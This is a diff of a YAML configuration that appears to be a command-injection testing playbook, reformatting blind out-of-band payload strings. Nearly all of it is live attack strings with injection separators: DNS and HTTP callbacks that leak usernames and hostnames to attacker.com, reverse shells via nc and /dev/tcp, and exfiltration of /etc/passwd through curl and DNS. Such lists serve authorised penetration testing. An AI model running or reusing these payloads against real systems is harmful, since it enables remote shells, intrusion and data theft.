@@ -23,32 +23,42 @@ trigger_signals:
 payloads:
   dns_oob:
     linux:
-      - "; nslookup $(whoami).attacker.com"
-      - "; nslookup \`whoami\`.attacker.com"
-      - "| nslookup $(id).attacker.com"
-      - "& dig +short $(hostname).attacker.com"
+      - >
+          ; nslookup $(whoami).attacker.com
+      - >
+          ; nslookup `whoami`.attacker.com
+      - >
+          | nslookup $(id).attacker.com
+      - >
+          & dig +short $(hostname).attacker.com
     windows:
       - "& nslookup %USERNAME%.attacker.com"
       - "| nslookup %COMPUTERNAME%.attacker.com"
 
   http_oob:
     linux:
-      - "; curl http://attacker.com/$(whoami)"
-      - "| wget -qO- http://attacker.com/\`hostname\`"
+      - >
+          ; curl http://attacker.com/$(whoami)
+      - >
+          | wget -qO- http://attacker.com/`hostname`
     windows:
       - "& curl http://attacker.com/%USERNAME%"
 
   tcp_oob:
     linux:
-      - "; nc attacker.com 4444 -e /bin/sh"
-      - "| bash -c 'exec 3<>/dev/tcp/attacker.com/4444; echo $(whoami) >&3'"
+      - >
+          ; nc attacker.com 4444 -e /bin/sh
+      - >
+          | bash -c 'exec 3<>/dev/tcp/attacker.com/4444; echo $(whoami) >&3'
     windows:
       - "& nc.exe attacker.com 4444 -e cmd.exe"
 
   data_exfil:
     linux:
-      - "; curl http://attacker.com/ -d @/etc/passwd"
-      - "| nslookup $(cat /etc/passwd | base64 | head -c 50).attacker.com"
+      - >
+          ; curl http://attacker.com/ -d @/etc/passwd
+      - >
+          | nslookup $(cat /etc/passwd | base64 | head -c 50).attacker.com
 
 detection_setup:
   - "Burp Collaborator: 生成唯一域名 → 注入 → 观察 DNS/HTTP 请求"
